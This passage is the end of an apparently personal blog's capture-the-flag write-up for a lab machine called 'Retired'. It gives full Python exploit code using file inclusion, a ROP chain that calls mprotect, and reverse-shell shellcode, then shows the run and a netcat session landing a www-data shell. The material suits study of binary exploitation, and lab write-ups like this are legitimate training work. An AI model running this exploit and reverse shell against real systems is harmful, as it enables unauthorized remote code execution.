+</span></span><span style="display:flex;"><span>    stack_end <span style="color:#f92672">=</span> int(re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#34;^.*\[stack\].*$&#34;</span>, r<span style="color:#f92672">.</span>text, re<span style="color:#f92672">.</span>M)<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;-&#34;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split()[<span style="color:#ae81ff">0</span>], <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> libc_base, libc_path,libsqlite_base, libsqlite_path, stack_base, stack_end
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span>:
+</span></span><span style="display:flex;"><span>        usage()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        ip <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>inet_aton(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>])
+</span></span><span style="display:flex;"><span>        port <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&gt;H&#34;</span>,int(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>]))
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[-] Invalid arguments&#34;</span>)
+</span></span><span style="display:flex;"><span>        usage()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Shellcode     msfvenom -p linux/x64/shell_reverse_tcp LHOST=ip LPORT=port -f py</span>
+</span></span><span style="display:flex;"><span>    shellcode <span style="color:#f92672">=</span>  <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x97\x48\xb9\x02\x00</span><span style="color:#e6db74">&#34;</span>   <span style="color:#f92672">+</span> port  <span style="color:#f92672">+</span>  ip <span style="color:#f92672">+</span>   <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x51\x48</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># search PID with LFI</span>
+</span></span><span style="display:flex;"><span>    pid <span style="color:#f92672">=</span> get_pid()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> pid:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[-] Could not find PID for activate_license&#34;</span>)
+</span></span><span style="display:flex;"><span>        exit()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># search addresses in /proc/PID/maps</span>
+</span></span><span style="display:flex;"><span>    libc_base, libc_path, libsqlite_base, libsqlite_path, stack_base, stack_end <span style="color:#f92672">=</span> get_addresses(pid)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># calc sizeof(stack) for mprotect</span>
+</span></span><span style="display:flex;"><span>    stack_size <span style="color:#f92672">=</span> stack_end <span style="color:#f92672">-</span> stack_base     <span style="color:#75715e"># 0x21000</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    context<span style="color:#f92672">.</span>clear(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># we need the same libraries versions used on the remote machine</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># to obtain a succesful result. So we downloaded the needed libraries</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># from the remote machine</span>
+</span></span><span style="display:flex;"><span>    libc <span style="color:#f92672">=</span> ELF(get_file(libc_path),checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)              <span style="color:#75715e"># download libc</span>
+</span></span><span style="display:flex;"><span>    libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> libc_base
+</span></span><span style="display:flex;"><span>    libsql <span style="color:#f92672">=</span> ELF(get_file(libsqlite_path),checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)       <span style="color:#75715e"># download libsqlite</span>
+</span></span><span style="display:flex;"><span>    libsql<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> libsqlite_base
+</span></span><span style="display:flex;"><span>    rop <span style="color:#f92672">=</span> ROP([libc, libsql])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">520</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># search ROP Gadgets</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># we will use thes gadgets in order to push the arguments needed</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># by mprotect function and we need to respect the x64 assembly calling convention</span>
+</span></span><span style="display:flex;"><span>    mprotect <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;mprotect&#39;</span>]     <span style="color:#75715e"># 0xf8c20           readelf -s libc.so.6 | grep mprotect</span>
+</span></span><span style="display:flex;"><span>    pop_rdi <span style="color:#f92672">=</span> rop<span style="color:#f92672">.</span>rdi[<span style="color:#ae81ff">0</span>]                    <span style="color:#75715e"># 0x26796           ropper -f libc.so.6 --search &#34;pop rdi&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    pop_rsi <span style="color:#f92672">=</span> rop<span style="color:#f92672">.</span>rsi[<span style="color:#ae81ff">0</span>]                    <span style="color:#75715e"># 0x2890f           ropper -f libc.so.6 --search &#34;pop rsi&#34;</span>
+</span></span><span style="display:flex;"><span>    pop_rdx <span style="color:#f92672">=</span> rop<span style="color:#f92672">.</span>rdx[<span style="color:#ae81ff">0</span>]                    <span style="color:#75715e"># 0xcb1cd           ropper -f libc.so.6 --search &#34;pop rdx&#34;</span>
+</span></span><span style="display:flex;"><span>    jmp_rsp <span style="color:#f92672">=</span> rop<span style="color:#f92672">.</span>jmp_rsp[<span style="color:#ae81ff">0</span>]                <span style="color:#75715e"># 0xd431d           ropper -f libsqlite3.so.0.8.6 --search &#34;jmp rsp&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> offset
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#disable the NX protection</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#int mprotect(void *addr, size_t len, int prot);</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(pop_rdi) <span style="color:#f92672">+</span> p64(stack_base)       <span style="color:#75715e"># addr = Begin of Stack</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(pop_rsi) <span style="color:#f92672">+</span> p64(stack_size)       <span style="color:#75715e"># len = size of Stack</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(pop_rdx) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">7</span>)                <span style="color:#75715e"># prot = Permission 7 -&gt; rwx</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(mprotect)                        <span style="color:#75715e"># call mprotect</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(jmp_rsp)                         <span style="color:#75715e"># jmp rsp</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> shellcode                            <span style="color:#75715e"># add shellcode</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># File Upload beta.html</span>
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;http://</span><span style="color:#e6db74">{</span>IP<span style="color:#e6db74">}</span><span style="color:#e6db74">/activate_license.php&#34;</span>, files <span style="color:#f92672">=</span> { <span style="color:#e6db74">&#34;licensefile&#34;</span>: payload } )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div><ul>
+<li>References to go further:
+<ul>
+<li><a href="https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/linux-x64-calling-convention-stack-frame">x64 assembly calling convention</a></li>
+<li><a href="https://beta.hackndo.com/return-oriented-programming/">ROP chains - French</a></li>
+<li><a href="https://ctf101.org/binary-exploitation/return-oriented-programming/">ROP chains - English - CTF101</a></li>
+<li><a href="https://valsamaras.medium.com/introduction-to-x64-linux-binary-exploitation-part-3-rop-chains-3cdcf17e8826">Disable NX protection with mprotect by +Ch0pin</a></li>
+</ul>
+</li>
+</ul>
+<h4 id="run-the-exploit-shell-as-www-data">Run The Exploit: Shell As WWW-DATA</h4>
+<ul>
+<li>Start the exploitation code:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Terminal-1</span>
+</span></span><span style="display:flex;"><span>~
+</span></span><span style="display:flex;"><span>❯ ./exploit.py 10.10.16.6 <span style="color:#ae81ff">9999</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> activate_license running @ PID <span style="color:#ae81ff">401</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Loaded <span style="color:#ae81ff">190</span> cached gadgets <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;/tmp/libc-2.31.so&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Loaded <span style="color:#ae81ff">162</span> cached gadgets <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;/tmp/libsqlite3.so.0.8.6&#39;</span>
+</span></span></code></pre></div><ul>
+<li>Receive connection from the tcp shell code with netcat:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Terminal-2</span>
+</span></span><span style="display:flex;"><span>~
+</span></span><span style="display:flex;"><span>❯ nc -lvp <span style="color:#ae81ff">9999</span>
+</span></span><span style="display:flex;"><span>Listening on DESKTOP-I8TJHTD <span style="color:#ae81ff">9999</span>
+</span></span><span style="display:flex;"><span>Connection received on 10.10.11.154 <span style="color:#ae81ff">44496</span>
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>2022-12-08_20-06-00-html.zip
+</span></span><span style="display:flex;"><span>2022-12-08_20-07-00-html.zip
+</span></span><span style="display:flex;"><span>2022-12-08_20-08-00-html.zip
+</span></span><span style="display:flex;"><span>html
+</span></span><span style="display:flex;"><span>license.sqlite
+</span></span><span style="display:flex;"><span>bash -i
+</span></span><span style="display:flex;"><span>bash: cannot set terminal process group <span style="color:#f92672">(</span>401<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+</span></span><span style="display:flex;"><span>bash: no job control in this shell
+</span></span><span style="display:flex;"><span>www-data@retired:/var/www$ echo <span style="color:#e6db74">&#34;FootHold&#34;</span>
+</span></span></code></pre></div><h2 id="to-be-continued-">To be continued &hellip;</h2>
+
+		</section>
+
+		<div class="post-tags">
+			
+			
+			
+		</div>
+	</article>
+</main>
+<footer>
+  <div style="display:flex"><a class="soc" href="https://github.com/Hassan-Al-Achek" rel="me" title="GitHub"><i data-feather="github"></i></a>
+    <a class="border"></a><a class="soc" href="https://twitter.com/0xh41" rel="me" title="Twitter"><i data-feather="twitter"></i></a>
+    <a class="border"></a><a class="soc" href="https://www.instagram.com/hassanalachek/" rel="me" title="Instagram"><i data-feather="instagram"></i></a>
+    <a class="border"></a></div>
+  <div class="footer-info">
+    2022  © 0xh41 |  <a
+      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
+  </div>
+</footer>
+
+
+<script>
+  feather.replace()
+</script></div>
+    </body>
+</html>
